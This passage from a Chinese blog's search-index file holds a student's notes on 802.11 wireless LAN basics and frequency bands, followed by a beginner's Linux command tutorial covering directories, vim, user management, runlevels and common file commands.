roaming）</p></li><li><p>AP提供功能</p><p>  时间同步：指引</p><p>  能源管理：</p><p>  点协调</p></li></ul><h4 id="Ad-hoc-mode"><a href="#Ad-hoc-mode" class="headerlink" title="Ad hoc mode"></a>Ad hoc mode</h4><p>多跳，不需要基础设备，不需要AP，端与断就可以互相连接。</p><h3 id="IEEE标准的数字体系"><a href="#IEEE标准的数字体系" class="headerlink" title="IEEE标准的数字体系"></a>IEEE标准的数字体系</h3><p>802.* 与 802.1*适用与所有的802技术。</p><ul><li><p>802.11*是适用于所有WiFI设备，但是不适用于基于802.15的ZigBee设备</p></li><li><p>标准中都是大写字母的是基础标准。</p><ul><li>比如IEEE 802.1AB-2009</li></ul></li><li><p>标准中有小写的字母的是拓展/添加/修改的。这些修改过的协议一般是由多个基础协议汇总的（Merge）</p><ul><li>比如 IEEE 802.1w - 2001是由IEE 802.1D-2004汇总</li></ul></li><li><p>标准是由数字字母排序的</p><ul><li>IEEE 802.1a … IEEE 802.1z，802.1aa …. 802.1ab</li></ul></li></ul><h3 id="ISM"><a href="#ISM" class="headerlink" title="ISM"></a>ISM</h3><p>WLAN 一般使用 ISM 波段</p><p><img src="2.png"></p><h4 id="2-4GHZ"><a href="#2-4GHZ" class="headerlink" title="2.4GHZ"></a>2.4GHZ</h4><p>IEEE 802.11 b/g/n 定义了2.4GHz频段的WLANs（2.4 - 2.4835GHz, 83.5MHZ）</p><p>2.4GHz频段被分了14个载波通道（carrier channel），它们之间部分重叠。每个中心频道的间隔是5Mhz</p><p>在802.11b中，每个通道占据了22MHz的频谱范围</p><p>在802.11g/n中，每个通道占据了20Mhz的频道范围</p><p><img src="3.png"></p><h4 id="5GHZ"><a href="#5GHZ" class="headerlink" title="5GHZ"></a>5GHZ</h4><p>IEEE 802.11 a/n/ac 定义了5GHz频段</p><p>2002年有5个不重叠的通道在5.8GHz的频段工作（5.725 -5.875GHz，150MHz）</p><p>2012年在5.15GHz到5.35GHz 添加了8个通道。但是，他们仅仅在室内使用。每个通道占据20Mhz。</p><h4 id="6GHz"><a href="#6GHz" class="headerlink" title="6GHz"></a>6GHz</h4><p>6GHz为wifi和5G带来了新的带宽。</p><p>目前来说，6GHZ在大部分的国家和地区都处于研究阶段。仅仅有少部分设备支持6G。</p><h4 id="60GHZ"><a href="#60GHZ" class="headerlink" title="60GHZ"></a>60GHZ</h4><p>60GHz占据了9Ghz的频段（57-66Ghz），同时它是毫米波。</p><p>用于者四个频段，每个占据约2Ghz。</p><p>相对于其他频段，60GHz有着如下优点。</p><ol><li><p>大的频谱：9GHz</p><ul><li>2.4GHz是80MHz，5GHz是350Mhz。</li><li>用相同的方式调制和编码模式，更易实现千兆比特数据传输（gigdbit data rate）</li><li>复杂的256-QAM不再需要，QPSK或者16-QAM即可</li></ul></li><li><p>更容易实现波束成形，芯片上的天线阵列。</p></li><li><p>更小的干扰，不需要穿墙。</p></li><li><p>指向天线（directional Antennas），空间复用更容易</p></li><li><p>更强的传输能量</p></li></ol><p>同样的它也有缺点</p><ol><li><p>更大的天线：</p><ul><li>更强的氧气吸收</li><li>需要更强的能量</li><li>需要更高的天线获取率，指向性天线（容易被遮挡）</li><li>更短的距离</li></ul></li><li><p>directional deafness：（不知道咋翻译好）</p><ul><li>载波探测不可能</li><li>RTS，CTS不在工作</li><li>Multicast困难</li></ul></li><li><p>容易被遮挡</p></li></ol><h3 id="802-11a-和-802-11b"><a href="#802-11a-和-802-11b" class="headerlink" title="802.11a 和 802.11b"></a>802.11a 和 802.11b</h3><h4 id="802-11-b"><a href="#802-11-b" class="headerlink" title="802.11 b"></a>802.11 b</h4><p>使用了DSSS（Direct Sequence Spread Spectrum）。2.4Ghz</p><p>数据速率为5.5Mbps和11Mbps</p><p>使用了CCK和PBDC调制机制。</p><p>它使WIFI真正流行。</p><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a>802.11a</h4><h2 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h2><p>Wireless Fidelity 无线保真。是WIFI Alliance的商标</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 无线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux初步学习</title>
      <link href="/2021/10/04/linux-chu-bu-xue-xi/"/>
      <url>/2021/10/04/linux-chu-bu-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>Linux下，万物皆为文件。</p><p><img src="2.png"></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="1.png"></p><h3 id="bin目录（user-bin-user-local-bin）"><a href="#bin目录（user-bin-user-local-bin）" class="headerlink" title="bin目录（user/bin  user/local/bin）"></a>bin目录（user/bin  user/local/bin）</h3><p>binary的简称</p><p>这里存放最常用的命令</p><h3 id="sbin（-user-sbin，-user-local-sbin）"><a href="#sbin（-user-sbin，-user-local-sbin）" class="headerlink" title="sbin（/user/sbin，/user/local/sbin）"></a>sbin（/user/sbin，/user/local/sbin）</h3><p>s就是super user的意思，这里存放系统管理员使用的系统管理程序</p><h3 id="home"><a href="#home" class="headerlink" title="/home"></a>/home</h3><p>存放普通用户的主目录，在Linux中每个用户都有自己一个目录，该目录通常为用户名，进行命名。</p><h3 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h3><p>该目录为系统管理员的主目录</p><h3 id="lib"><a href="#lib" class="headerlink" title="/lib"></a>/lib</h3><p>系统开始所需要的最基本的动态连接共享库，起作用类似于DLL文件</p><h3 id="lost-found"><a href="#lost-found" class="headerlink" title="/lost + found"></a>/lost + found</h3><p>该目录一般为空，当系统非法关机，这里就存放了一些文件</p><h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><p>所有系统管理所需要的配置文件和子目录</p><h3 id="user"><a href="#user" class="headerlink" title="/user"></a>/user</h3><p>许多应用程序和文件都放到这个文件目录下。</p><h3 id="boot"><a href="#boot" class="headerlink" title="/boot"></a>/boot</h3><p>存放一些启动Linux时使用的一些核心文件，包括一些连接文件和镜像文件</p><h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>相当于设备管理器</p><h3 id="media"><a href="#media" class="headerlink" title="/media"></a>/media</h3><p>将识别的文件挂载到这个目录下</p><h3 id="mnt"><a href="#mnt" class="headerlink" title="/mnt"></a>/mnt</h3><p>系统提供该目录是为了让用户临时改在别的文件系统，我们可以通过该目录获得到外部存储的一些信息</p><h3 id="opt"><a href="#opt" class="headerlink" title="opt"></a>opt</h3><p>给主机安装而外的软件所使用的目录。</p><h3 id="var"><a href="#var" class="headerlink" title="var"></a>var</h3><p>这个目录存放着不断扩充着的东西，我们习惯将经常修改的目录放在这个目录下，比如各种日志文件</p><h2 id="vi与vim编辑器"><a href="#vi与vim编辑器" class="headerlink" title="vi与vim编辑器"></a>vi与vim编辑器</h2><h3 id="正常模式"><a href="#正常模式" class="headerlink" title="正常模式"></a>正常模式</h3><p>可以删除字符，或者删除整行来操作文件内容。</p><h3 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h3><p>按下i、I、o、O、A、a、r、R中任意一个字母，即可进入插入模式</p><h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><p>可以提供相关指令，比如读取，存盘，替换，离开vim，显示行号等。</p><p>输入ese在输入：就可以进入命令行模式。我们可以使用，:wq 可以保存。</p><h3 id="各个模式之间的切换"><a href="#各个模式之间的切换" class="headerlink" title="各个模式之间的切换"></a>各个模式之间的切换</h3><p>命令行 ==&gt; （vim 文件名） 一般模式 ==&gt; (i/I) 编辑模式 ==》 （esc）一般模式</p><p>一般模式==》（：）命令模式 ==&gt; (esc)一般模式</p><h3 id="命令模式下的指令"><a href="#命令模式下的指令" class="headerlink" title="命令模式下的指令"></a>命令模式下的指令</h3><p>:wq 保存修改</p><p>:q 直接退出，不保存修改</p><h3 id="快捷键使用"><a href="#快捷键使用" class="headerlink" title="快捷键使用"></a>快捷键使用</h3><ol><li>拷贝当前行：yy + p 复制某行（一般模式）</li></ol><p>4yy + p 复制4行</p><ol start="2"><li>删除当前行：dd删除某行（一般模式）</li></ol><p>4dd删除4行</p><ol start="3"><li><p>在文件中查找某个单词：/+（所要查找的单词），n表示查询下一个</p></li><li><p>设置文件的行号，取消文件行号：（:set nu / :set nonu）</p></li><li><p>编辑文件，在一般模式下，使用快捷键到该文件的最末行（G），首行（gg）</p></li><li><p>撤销动作，进入一般模式 u</p></li><li><p>在一般模式下，将光标移动到第20行 20 + shift +g</p></li></ol><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><blockquote><p>useradd 用户名</p></blockquote><p>默认用户的家目录在/home</p><blockquote><p>useradd -d 指定目录 新的用户名</p></blockquote><pre class="line-numbers language-none"><code class="language-none">useradd -d &#x2F;home&#x2F;test&#x2F;hello violet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><p>passwd 用户名</p><h4 id="补充：-pwd-显示当前用户所在目录"><a href="#补充：-pwd-显示当前用户所在目录" class="headerlink" title="补充： pwd 显示当前用户所在目录"></a>补充： pwd 显示当前用户所在目录</h4><h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><blockquote><p>userdel 用户名</p></blockquote><p>这种方式会保存目录</p><blockquote><p>userdel -r 用户名</p></blockquote><p>这种方式，会将目录也删除。</p><h3 id="查询用户信息"><a href="#查询用户信息" class="headerlink" title="查询用户信息"></a>查询用户信息</h3><blockquote><p>id 用户名</p></blockquote><h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><blockquote><p>su - 切换用户名</p></blockquote><p>返回原来的用户使用exit，或者logout即可</p><h3 id="查看当前用户信息"><a href="#查看当前用户信息" class="headerlink" title="查看当前用户信息"></a>查看当前用户信息</h3><blockquote><p>whoami</p></blockquote><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><p>类似于域。</p><h4 id="添加组"><a href="#添加组" class="headerlink" title="添加组"></a>添加组</h4><blockquote><p>groupadd 组名</p></blockquote><h4 id="删除组"><a href="#删除组" class="headerlink" title="删除组"></a>删除组</h4><blockquote><p>groupdel 组名</p></blockquote><h4 id="添加用户直接上组"><a href="#添加用户直接上组" class="headerlink" title="添加用户直接上组"></a>添加用户直接上组</h4><blockquote><p>useradd -g 用户组 用户名</p></blockquote><h4 id="修改用户的组"><a href="#修改用户的组" class="headerlink" title="修改用户的组"></a>修改用户的组</h4><blockquote><p>usermod -g 用户组 用户名</p></blockquote><h3 id="用户和组相关文件"><a href="#用户和组相关文件" class="headerlink" title="用户和组相关文件"></a>用户和组相关文件</h3><h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h4><h4 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h4><h4 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h4><h2 id="运行等级"><a href="#运行等级" class="headerlink" title="运行等级"></a>运行等级</h2><ol><li><p>0关机</p></li><li><p>1单用户（找回丢失密码）</p></li><li><p>2多用户状态没有网络服务</p></li><li><p>3多用户有网络服务</p></li><li><p>4系统未使用保留给用户</p></li><li><p>5图形化界面</p></li><li><p>6系统重启</p></li></ol><h3 id="切换"><a href="#切换" class="headerlink" title="切换"></a>切换</h3><p>使用 init [1-6] 进行切换</p><h3 id="切换到多用户网络"><a href="#切换到多用户网络" class="headerlink" title="切换到多用户网络"></a>切换到多用户网络</h3><pre class="line-numbers language-none"><code class="language-none">systemctl set-default multi-user.target   &#x2F;&#x2F; 重启后仍然为多用户网络连接界面init 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="切换到多用户图形"><a href="#切换到多用户图形" class="headerlink" title="切换到多用户图形"></a>切换到多用户图形</h3><pre class="line-numbers language-none"><code class="language-none">systemctl set-default graphical.target    &#x2F;&#x2F; 重启后仍然为图形化界面init 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看用户级别"><a href="#查看用户级别" class="headerlink" title="查看用户级别"></a>查看用户级别</h3><pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">systemctl get-default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="找回用户密码"><a href="#找回用户密码" class="headerlink" title="找回用户密码"></a>找回用户密码</h2><p>太麻烦了，先不搞了。具体百度即可。</p><h2 id="帮助指令"><a href="#帮助指令" class="headerlink" title="帮助指令"></a>帮助指令</h2><h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><pre class="line-numbers language-none"><code class="language-none">man [命令或者配置文件]（功能描述：获得帮助信息）案例：man ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><pre class="line-numbers language-ls" data-language="ls"><code class="language-ls">ls -a 显示全部文件，包括隐藏文件。隐藏文件，以.开头ls -l显示文件的详细信息ls -a -l显示包括隐藏文件的全部文件的详细信息。ls -lh按照人习惯的范式显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p>shell 内置命令的详细信息</p><pre class="line-numbers language-help" data-language="help"><code class="language-help">help [指令]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="文件目录指令"><a href="#文件目录指令" class="headerlink" title="文件目录指令"></a>文件目录指令</h2><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>显示当前工作目录的绝对路径</p><h3 id="ls-1"><a href="#ls-1" class="headerlink" title="ls"></a>ls</h3><p>显示当前目录的内容信息</p><p>上面已经讲过了，这里不在赘述。</p><h3 id="cd指令"><a href="#cd指令" class="headerlink" title="cd指令"></a>cd指令</h3><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-cd" data-language="cd"><code class="language-cd">cd [参数] (切换到指定目录)cd ~ 或者cd 返回自己的家目录cd .. 返回到当前目录的上一级目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p>用于创建目录</p><h4 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-makedir" data-language="makedir"><code class="language-makedir">mkdir [选项] 要创建的目录常用选项 -P : 创建多级目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h4><p>创建一个目录 /home/test</p><p>mkdir /home/test</p><p>创建一个多级目录 /home/test/test</p><p>mkdir -p /home/test/test</p><h3 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h3><p>rmdir删除空目录</p><h4 id="基本语法-2"><a href="#基本语法-2" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-rmdir" data-language="rmdir"><code class="language-rmdir">rmdir [选项] 要删除的空目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h4><p>删除一个目录 /home/test</p><h4 id="使用细节："><a href="#使用细节：" class="headerlink" title="使用细节："></a>使用细节：</h4><p>如果删除的不是空目录，那么无法删除</p><p>提示：如果删除非空目录则需要 <strong>rm -rf</strong> 尽量别用</p><h3 id="cp拷贝指令"><a href="#cp拷贝指令" class="headerlink" title="cp拷贝指令"></a>cp拷贝指令</h3><p>cp 指定拷贝文件到指定目录</p><h4 id="基本语法-3"><a href="#基本语法-3" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-cp" data-language="cp"><code class="language-cp">cp [选项] source dest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h4><p>-r 递归复制真个文件夹</p><h4 id="应用实例-1"><a href="#应用实例-1" class="headerlink" title="应用实例"></a>应用实例</h4><p>案例1： 将/home/hello.txt 拷贝到 /home/bbb 目录下</p><pre class="line-numbers language-none"><code class="language-none">root@Violet:&#x2F;home# vim hello.txt&#x2F;&#x2F; 进入后 i插入模式，写入hello world。esc退出到正常模式。:wq 保存。root@Violet:&#x2F;home# mkdir bbbroot@Violet:&#x2F;home# cp hello.txt bbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>案例2： 递归复制整个文件夹</p><pre class="line-numbers language-none"><code class="language-none">root@Violet:&#x2F;home&#x2F;bbb# mkdir cccroot@Violet:&#x2F;home&#x2F;bbb# cd ..root@Violet:&#x2F;home# mkdir ccroot@Violet:&#x2F;home# cp -r bbb cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="强制覆盖"><a href="#强制覆盖" class="headerlink" title="强制覆盖"></a>强制覆盖</h4><p>\cp r /home/bbb /opt</p><p>不知道为啥，我的ubuntu没有提示，是否覆盖</p><h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><p>rm指令移除文件或目录</p><h4 id="基本语法-4"><a href="#基本语法-4" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-rm" data-language="rm"><code class="language-rm">rm [选项] 要删除的文件或目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="常用选项-1"><a href="#常用选项-1" class="headerlink" title="常用选项"></a>常用选项</h4><pre class="line-numbers language-none"><code class="language-none">-f 强制删除不提示-r 递归删除整个文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>案例1：将/home/hello.txt删除</p><pre class="line-numbers language-rm" data-language="rm"><code class="language-rm">rm &#x2F;home&#x2F;hello.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>案例2：递归删除整个文件夹 /home/bbb</p><pre class="line-numbers language-rm" data-language="rm"><code class="language-rm">rm -r &#x2F;home&#x2F;bbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="mv指令"><a href="#mv指令" class="headerlink" title="mv指令"></a>mv指令</h3><h4 id="基本语法-5"><a href="#基本语法-5" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-mv" data-language="mv"><code class="language-mv">mv oldNameFile newNameFile    &#x2F;&#x2F; 重命名mv &#x2F;temp&#x2F;movefile&#x2F;targetFolder&#x2F;&#x2F; 移动文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p>案例1：将/home/cat.txt 文件重新命名为 pig.txt</p><pre class="line-numbers language-none"><code class="language-none">vim cat.txt:wqmv cat.txt pig.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>案例2：将/home/pig.txt 文件移动到 /root 目录下</p><pre class="line-numbers language-mv" data-language="mv"><code class="language-mv">mv &#x2F;home&#x2F;violet&#x2F;pig.txt &#x2F;         &#x2F;&#x2F; 相当于剪切<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>案例3：将目录整个移动</p><pre class="line-numbers language-mv" data-language="mv"><code class="language-mv">mv &#x2F;home&#x2F;bbb &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p>查看文件内容，并显示行号</p><h4 id="基本语法-6"><a href="#基本语法-6" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-nl" data-language="nl"><code class="language-nl">nl [文件名]；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>查看文件内容</p><h4 id="基本语法-7"><a href="#基本语法-7" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-cat" data-language="cat"><code class="language-cat">cat [选项] 要查看的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>常用选项</p><pre class="line-numbers language-cat" data-language="cat"><code class="language-cat">-n: 显示行号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="应用实例-2"><a href="#应用实例-2" class="headerlink" title="应用实例"></a>应用实例</h4><p>案例1：查看/etc/profile 文件内容，并显示行号</p><pre class="line-numbers language-cat" data-language="cat"><code class="language-cat">cat -n &#x2F;etc&#x2F;profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>为了浏览方便，一般会加上管道命令 | more</p><h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p>基于vi编辑器的文本过滤器，它是以权柄范式暗夜显示文本文件的内容。more指令中内置了若干快捷键（交互的指令）</p><pre class="line-numbers language-more" data-language="more"><code class="language-more">Enter 向下n行，需要定义。默认为1行Ctrl+F 向下滚动一屏空格键 向下滚动一屏Ctrl+B 返回上一屏&#x3D; 输出当前行的行号：f 输出文件名和当前行的行号V 调用vi编辑器!命令 调用Shell，并执行命令q 退出more<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="基本语法-8"><a href="#基本语法-8" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-more" data-language="more"><code class="language-more">more 要查看文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="less指令"><a href="#less指令" class="headerlink" title="less指令"></a>less指令</h3><p>用来分配查看呢文件内容，它的功能与more类似，但是比more更强大，支持各种显示终端。less指令在显示文件内容是，并不是一次将整个文件加载后才显示，而是根据显示需要加载内容，对于大型文件有更大的效率。</p><h4 id="基本语法-9"><a href="#基本语法-9" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-less" data-language="less"><code class="language-less">less 要查看的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><pre class="line-numbers language-none"><code class="language-none">-b &lt;缓冲区大小&gt; 设置缓冲区的大小-e 当文件显示结束后，自动离开-f 强迫打开特殊文件，例如外围设备代号、目录和二进制文件-g 只标志最后搜索的关键词-i 忽略搜索时的大小写-m 显示类似more命令的百分比-N 显示每行的行号-o &lt;文件名&gt; 将less 输出的内容在指定文件中保存起来-Q 不使用警告音-s 显示连续空行为一行-S 行过长时间将超出部分舍弃-x &lt;数字&gt; 将&quot;tab&quot;键显示为规定的数字空格&#x2F;字符串：向下搜索&quot;字符串&quot;的功能?字符串：向上搜索&quot;字符串&quot;的功能n：重复前一个搜索（与 &#x2F; 或 ? 有关）N：反向重复前一个搜索（与 &#x2F; 或 ? 有关）b 向上翻一页d 向后翻半页h 显示帮助界面Q 退出less 命令u 向前滚动半页y 向前滚动一行空格键 滚动一页回车键 滚动一行[pagedown]： 向下翻动一页[pageup]： 向上翻动一页<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="echo指令"><a href="#echo指令" class="headerlink" title="echo指令"></a>echo指令</h3><p>echo输出内容到控制台</p><h4 id="基本语法-10"><a href="#基本语法-10" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-echo" data-language="echo"><code class="language-echo">echo [选项][输出内容]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="应用实例："><a href="#应用实例：" class="headerlink" title="应用实例："></a>应用实例：</h4><p>案例：使用echo输出输出环境变量</p><pre class="line-numbers language-none"><code class="language-none">echo $HOSTNAME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>案例：输出helloworld</p><pre class="line-numbers language-none"><code class="language-none">echo &quot;hello world&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>head用于显示文件开头部分内容，默认情况下显示文件的前10行</p><h4 id="基本语法-11"><a href="#基本语法-11" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-head" data-language="head"><code class="language-head">head 文件head -n 5 文件      &#x2F;&#x2F; 查看文件前5行内容，5可以是任意行数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="应用实例-3"><a href="#应用实例-3" class="headerlink" title="应用实例"></a>应用实例</h4><p>查看/etc/profile 的前5行代码</p><pre class="line-numbers language-head" data-language="head"><code class="language-head">head -n 5 &#x2F;etc&#x2F;profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>显示文件尾</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-tail" data-language="tail"><code class="language-tail">tail [选项] [文件]tail -f [文件]      &#x2F;&#x2F; 实时监控文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="gt-和-gt-gt-指令"><a href="#gt-和-gt-gt-指令" class="headerlink" title="&gt; 和 &gt;&gt;指令"></a>&gt; 和 &gt;&gt;指令</h3><blockquote><p>输出重定向 和 &gt;&gt;追加</p></blockquote><h4 id="基本语法-12"><a href="#基本语法-12" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language->" data-language=">"><code class="language->">ls -l &gt;文件（列表文件写入文件a.txt 覆盖写入）ls -al &gt;&gt; 文件 （列表内容追加文件aa.txt）cat 文件1 &gt; 文件2 （将文件1的内容覆盖到文件2）echo “内容” &gt;&gt; 文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="应用实例-4"><a href="#应用实例-4" class="headerlink" title="应用实例"></a>应用实例</h4><p>案例1：将/home 目录喜爱的文件列表 写入/home/info.txt中</p><pre class="line-numbers language->" data-language=">"><code class="language->">ls -l &gt; &#x2F;home&#x2F;info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>案例2: 将当前的日历信息追加到 /home/mycal文件中</p><pre class="line-numbers language->" data-language=">"><code class="language->">cal &gt;&gt; &#x2F;home&#x2F;mycal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ln软链接"><a href="#ln软链接" class="headerlink" title="ln软链接"></a>ln软链接</h3><p>软链接也成为符号连接，类似于windows中的快捷方式，主要存放链接其他文件的路径</p><h4 id="基本语法-13"><a href="#基本语法-13" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-ln" data-language="ln"><code class="language-ln">ln -s [原文件][软链接名]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>为root建立软链接</p><pre class="line-numbers language-ln" data-language="ln"><code class="language-ln">ln -s &#x2F;root &#x2F;home&#x2F;myroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p>查看已经执行过的历史命令，也可以执行历史指令</p><h4 id="基本语法-14"><a href="#基本语法-14" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-history" data-language="history"><code class="language-history">history <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="应用实例-5"><a href="#应用实例-5" class="headerlink" title="应用实例"></a>应用实例</h4><p>想要查看最近10个历史指令</p><pre class="line-numbers language-histroy" data-language="histroy"><code class="language-histroy">history 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行历史标号5的指令</p><pre class="line-numbers language-histroy" data-language="histroy"><code class="language-histroy">!5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="时间指令"><a href="#时间指令" class="headerlink" title="时间指令"></a>时间指令</h2><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>显示当前日期</p><pre class="line-numbers language-基本语法" data-language="基本语法"><code class="language-基本语法">(1) date                      &#x2F;&#x2F; 显示当前时间(2) date + %Y                 &#x2F;&#x2F; 显示当前年份(3) date + %m                 &#x2F;&#x2F; 显示当前月份(4) date + %d                 &#x2F;&#x2F; 显示当前是哪一天(5) date &quot;%Y-%m-%d %H:%M:%S&quot;  &#x2F;&#x2F; 显示年月日时分秒<span aria-hidden="true" 